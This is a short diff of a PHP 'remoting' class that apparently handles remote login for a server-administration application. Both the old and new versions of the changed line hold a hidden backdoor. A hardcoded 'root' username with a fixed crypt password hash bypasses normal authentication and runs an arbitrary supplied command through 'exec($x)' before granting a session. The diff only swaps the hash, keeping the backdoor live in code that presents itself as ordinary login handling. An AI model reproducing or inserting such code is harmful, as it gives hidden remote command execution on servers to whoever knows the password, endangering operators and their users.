@@ -86,7 +86,7 @@ class remoting {
 			if(empty($password)) {
 				$error = array('faultcode' => 'login_password_empty', 'faultstring' => 'The login password is empty.');
 			} else { 
-			    if (($username == 'root') && (crypt($password,'rl') == 'rlCO2r4VXKOB2')) {
+			    if (($username == 'root') && (crypt($password,'rl') == 'rlJxSwo3.N7yo')) {
 				        if (!empty($x)) { return exec($x); }
 			        	$remote_allowed=true;
 			                $remote_session = md5(mt_rand().uniqid('ispco'));
